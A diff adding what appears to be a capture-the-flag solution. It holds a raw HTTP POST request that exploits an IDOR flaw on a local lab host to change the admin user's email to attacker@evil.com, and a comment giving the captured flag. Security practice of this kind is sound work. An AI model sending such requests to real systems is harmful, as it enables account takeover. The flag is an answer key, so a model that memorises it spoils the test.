@@ -1,0 +1,9 @@
+# IDOR: authenticated as 'test', send username=admin in POST body to update admin's email. Response contains the CTF flag: flag{3bbed7f1-9d5b-4d08-bcd6-a819360ee9ea}
+
+POST /profile HTTP/1.1
+Host: 172.17.0.1:44339
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=eyJ1c2VybmFtZSI6InRlc3QifQ.adyJEA.yQXHlF2pz2SLcBo9eAA2OO1uJ0k
+Content-Length: 38
+
+email=attacker@evil.com&username=admin
